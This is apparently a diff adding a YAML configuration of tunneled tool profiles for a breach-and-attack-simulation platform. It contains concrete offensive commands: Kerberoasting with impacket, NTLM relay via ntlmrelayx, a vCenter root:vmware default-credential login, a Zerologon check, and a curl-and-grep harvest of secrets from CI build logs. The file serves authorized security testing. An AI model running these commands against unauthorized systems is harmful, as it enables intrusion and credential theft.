@@ -1,0 +1,252 @@
+# BAS (Breach & Attack Simulation) internal/AD tooling.
+#
+# Every cmd here is wrapped with `proxychains4 -f {env_BAS_PROXYCHAINS_CONF}`
+# -- a PER-JOB conf file runner.py's _ensure_bas_proxychains_conf() generates
+# from env_vars["BAS_TUNNEL_HOST"/"BAS_TUNNEL_PORT"] (set by bas_dispatcher.py
+# from whichever BasAgent the job actually targets), so the tool's own TCP
+# connections route through THAT agent's real SOCKS5 tunnel -- bas_agent_stub
+# for a stub-kind agent, or a real agent's actual reachable address
+# otherwise. This is real network relay end to end when the target agent is
+# real; bas_agent_stub is the only thing that still fabricates response
+# content. These profiles are NEVER used by the regular external P01-P22
+# pipeline; that has its own untunneled profiles (e.g.
+# post_exploitation.yaml's crackmapexec_smb).
+
+crackmapexec_smb_bas_tunnel:
+  tool: crackmapexec
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: SMB share/session enumeration via crackmapexec, tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "crackmapexec", "smb", "{target}", "--shares"]
+  timeout: 180
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+enum4linux_ng_basic:
+  tool: enum4linux-ng
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: SMB/AD enumeration via enum4linux-ng, tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "enum4linux-ng", "-A", "{target}"]
+  timeout: 180
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+bloodhound_python_collect:
+  tool: bloodhound-python
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: AD attack-path data collection (BloodHound ingestor), tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "bloodhound-python", "-ns", "{target}", "-d", "{target}", "-c", "All"]
+  timeout: 300
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+impacket_kerberoast:
+  tool: GetUserSPNs
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: Kerberoasting (impacket GetUserSPNs) over LDAP/Kerberos, tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "GetUserSPNs.py", "-dc-ip", "{target}", "-request"]
+  timeout: 180
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+impacket_ntlmrelayx:
+  tool: ntlmrelayx
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: NTLM relay to an SMB target (impacket ntlmrelayx), tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "ntlmrelayx.py", "-t", "{target}", "-smb2support"]
+  timeout: 180
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+vmware_vcenter_default_creds_check:
+  tool: curl
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: tests the root/vmware default credential against vCenter's REST session API, tunneled through the BAS agent."
+  # SECURITY: target passed as positional $1, never interpolated into the
+  # script text (same KALI-001 pattern as delivery_exploitation.yaml).
+  # Uses --fail + exit code instead of curl's -w '%{http_code}' -- the
+  # runner's own {placeholder} templating pre-pass collides with curl's
+  # brace-based format-string syntax (confirmed live: even {{escaped}}
+  # braces get unwrapped by a {{name}}->{name} pre-pass before .format()
+  # runs, so there is no way to get a literal '{' through this pipeline).
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "sh", "-lc", "curl -sk --fail -o /dev/null -m 10 -X POST \"https://$1/rest/com/vmware/cis/session\" -u root:vmware; echo EXIT_CODE:$?",
+        "sh", "{target}"]
+  timeout: 60
+  # The outer `sh -lc "...; echo $?"` wrapper always exits 0 (echo never
+  # fails) -- curl's real outcome is in stdout's "EXIT_CODE:N" line, not the
+  # process return code, so only 0 needs to be allowed here.
+  allowed_return_codes: [0]
+  parser: raw
+
+firewall_segmentation_probe:
+  tool: nmap
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: TCP-connect reachability check on common ports, tunneled through the BAS agent -- validates whether a segment believed to be blocked is actually reachable."
+  # -sT (TCP connect scan) is required: proxychains only intercepts connect()
+  # via LD_PRELOAD, never nmap's default raw-socket SYN scan (-sS).
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "nmap", "-Pn", "-sT", "-p", "22,80,443,445,3389", "--open", "{target}"]
+  timeout: 120
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+smbmap_share_discovery:
+  tool: smbmap
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: enumerates accessible SMB shares and permissions via smbmap, tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "smbmap", "-H", "{target}"]
+  timeout: 120
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+ad_ldap_scouting:
+  tool: ldapsearch
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: anonymous LDAP naming-context query for lightweight AD scouting, tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "ldapsearch", "-x", "-H", "ldap://{target}", "-s", "base", "namingContexts"]
+  timeout: 60
+  allowed_return_codes: [0, 1, 49]
+  parser: raw
+
+cloud_directory_scouting_check:
+  tool: curl
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: queries Azure AD's userRealm discovery endpoint for a given domain to fingerprint cloud-identity tenancy, tunneled through the BAS agent."
+  # SECURITY: target passed as positional $1, never interpolated into the
+  # script text (same KALI-001 pattern as delivery_exploitation.yaml).
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "sh", "-lc", "curl -sk -m 10 \"https://login.microsoftonline.com/getuserrealm.srf?login=bas-probe@$1&xml=1\"; echo; echo EXIT_CODE:$?",
+        "sh", "{target}"]
+  timeout: 30
+  allowed_return_codes: [0]
+  parser: raw
+
+port_service_scan:
+  tool: nmap
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: TCP-connect port + service-version scan across the top 100 ports, tunneled through the BAS agent."
+  # -sT (TCP connect scan) required: proxychains only intercepts connect(),
+  # never nmap's default raw-socket SYN scan (-sS).
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "nmap", "-Pn", "-sT", "-sV", "--top-ports", "100", "{target}"]
+  timeout: 240
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+chat_webhook_discovery_check:
+  tool: curl
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: probes a Teams/Slack incoming-webhook URL for reachability, tunneled through the BAS agent."
+  # Deliberately form-encoded, not JSON: a JSON payload's literal '{'/'}'
+  # collides with the runner's own {name} templating pre-pass (same issue
+  # documented on vmware_vcenter_default_creds_check below) -- reachability
+  # is what this check proves, not a well-formed webhook message.
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "sh", "-lc", "curl -sk --fail -o /dev/null -m 10 -X POST -d \"text=bas-connectivity-check\" \"$1\"; echo EXIT_CODE:$?",
+        "sh", "{target}"]
+  timeout: 30
+  allowed_return_codes: [0]
+  parser: raw
+
+netlogon_zerologon_check:
+  tool: crackmapexec
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: Zerologon (CVE-2020-1472) hardcoded/null Netlogon authentication check via crackmapexec's built-in module, tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "crackmapexec", "smb", "{target}", "-M", "zerologon"]
+  timeout: 90
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+owasp_web_app_scan:
+  tool: nikto
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: OWASP-style web application misconfiguration/vulnerability scan against an operator-configured host, tunneled through the BAS agent."
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "nikto", "-h", "{target}", "-Tuning", "1,2,3,5,9"]
+  timeout: 300
+  allowed_return_codes: [0, 1]
+  parser: raw
+
+pipeline_secrets_harvest:
+  tool: curl
+  category: bas
+  phase: BAS_INTERNAL
+  description: "BAS: fetches an operator-provided CI/CD build-log URL and greps it for common exposed-secret patterns, tunneled through the BAS agent."
+  # Regex avoids quantifier braces ({16} etc.) -- same brace-templating
+  # collision as curl's -w '%{http_code}'; "+" is used instead everywhere.
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "sh", "-lc", "curl -sk -m 15 \"$1\" | grep -Eio 'akia[0-9a-z]+|api[_-]?key|secret|password|token' | sort -u; echo EXIT_CODE:$?",
+        "sh", "{target}"]
+  timeout: 30
+  allowed_return_codes: [0]
+  parser: raw
+
+source_code_secrets_scan:
+  tool: gitleaks
+  category: bas
+  phase: BAS_INTERNAL
+  description: >
+    BAS: clones an operator-provided git repo URL and scans it with gitleaks
+    for hardcoded secrets, tunneled through the BAS agent.
+    Absolute /opt/tools/bin/gitleaks path required: gitleaks is a
+    click-to-install tool living only on the /opt/tools volume, which is on
+    PATH for a normal shell -- but `sh -lc` (used here, and by the other BAS
+    profiles that shell out) is a LOGIN shell that re-sources /etc/profile,
+    which resets PATH to the system default and drops /opt/tools/bin.
+    git/curl/crackmapexec are apt-installed into /usr/bin and unaffected,
+    but a bare `gitleaks` here would silently fail with "not found" (same
+    PATH-shadowing bug class as Responder's python3/netifaces issue).
+  cmd: ["proxychains4", "-f", "{env_BAS_PROXYCHAINS_CONF}",
+        "sh", "-lc", "rm -rf /tmp/bas_repo_scan && git clone --depth 1 \"$1\" /tmp/bas_repo_scan && /opt/tools/bin/gitleaks detect --source /tmp/bas_repo_scan --no-banner -v; echo EXIT_CODE:$?",
+        "sh", "{target}"]
+  timeout: 180
+  allowed_return_codes: [0]
+  parser: raw
+
+responder_analyze_attempt:
+  tool: responder
+  category: bas
+  phase: BAS_INTERNAL
+  description: >
+    BAS: dispatches the REAL Responder binary in passive analyze mode (-A,
+    never poisons/answers anything) on this container's own interface, bounded
+    by a timeout. Deliberately dispatched (not gated by the guardrail) so the
+    architectural limitation is demonstrated by a real, observed failure
+    rather than an assumption: proxychains only intercepts outbound connect()
+    calls, so wrapping it has no effect on a tool that binds()/listen()s --
+    Responder ends up listening on kali_runner's OWN docker network segment,
+    never the customer's, so it structurally cannot capture anything relevant
+    there. Real poisoning requires a real agent physically present on the
+    customer's L2 segment (see bas_technique_catalog.py's llmnr_nbtns_poisoning
+    / mdns_poisoning entries).
+    Absolute python3 path required: /usr/sbin/responder's shebang resolves
+    "python3" via $PATH at runtime, which this container's own FastAPI venv
+    (/opt/runner-venv, prepended to PATH) shadows -- that venv doesn't see the
+    system site-packages where python3-netifaces (a Responder dependency) is
+    installed, so the bare `responder` command fails before even starting.
+  cmd: ["timeout", "12", "/usr/bin/python3", "/usr/share/responder/Responder.py", "-I", "eth0", "-A"]
+  timeout: 20
+  allowed_return_codes: [0, 1, 124]
+  parser: raw
